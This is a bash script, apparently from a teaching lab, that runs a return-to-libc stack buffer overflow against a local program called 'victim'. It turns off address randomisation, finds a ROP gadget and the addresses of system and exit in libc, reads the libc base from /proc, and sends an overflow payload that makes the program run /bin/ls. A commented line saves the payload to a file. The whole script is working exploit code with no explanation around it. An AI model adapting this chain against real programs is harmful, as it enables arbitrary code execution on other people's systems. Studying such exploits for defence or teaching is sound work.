#!/bin/bash

rm -f victim-input
mkfifo victim-input

libcloc=/lib/x86_64-linux-gnu/libc.so.6
bufsize=256
padsize=$((($bufsize+1)*2))

# grab offsets/addresses
gadget=0x$(xxd -c1 -p $libcloc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}')
system_offset=0x$(nm -D $libcloc | grep '\<system\>' | awk '{print $1}')
exit_offset=0x$(nm -D $libcloc | grep '\<exit\>' | awk '{print $1}')
buffer_addr=$(echo | setarch `arch` -R ./victim | head -n 1)

# start victim in background to grab libc load address
(tail --pid=$BASHPID -f victim-input | setarch `arch` -R ./victim > /dev/null) &
sleep 0.5s
pidc=$!
pidv=$(ps -C victim -o pid --no-headers | tr -d ' ')

libc=0x$(grep libc /proc/$pidv/maps | head -n 1 | awk '{split($0,a,"-"); print a[1]}')

# grab /bin/sh location from libc.so.6
#buffer_addr=0x$(strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh | awk '{print $1}' | tr -d ' ')
#buffer_addr=$(($libc+$buffer_addr))

# perform some cleanup
echo > victim-input
kill $pidc
kill $pidv
rm -f victim-input 

# run the actual exploit
(echo -n /bin/ls | xxd -p; printf %0${padsize}d 0; printf %016x $(($libc+$gadget)) | tac -rs..; printf %016x $buffer_addr | tac -rs..; printf %016x $(($libc+$system_offset)) | tac -rs..; printf %016x $(($libc+$exit_offset)) | tac -rs..) | xxd -r -p | setarch `arch` -R ./victim

# alternatively write to file for later execution
#(echo -n /bin/ls | xxd -p; printf %0${padsize}d 0; printf %016x $(($libc+$gadget)) | tac -rs..; printf %016x $buffer_addr | tac -rs..; printf %016x $(($libc+$system_offset)) | tac -rs..; printf %016x $(($libc+$exit_offset)) | tac -rs..) | xxd -r -p > exploit.bin
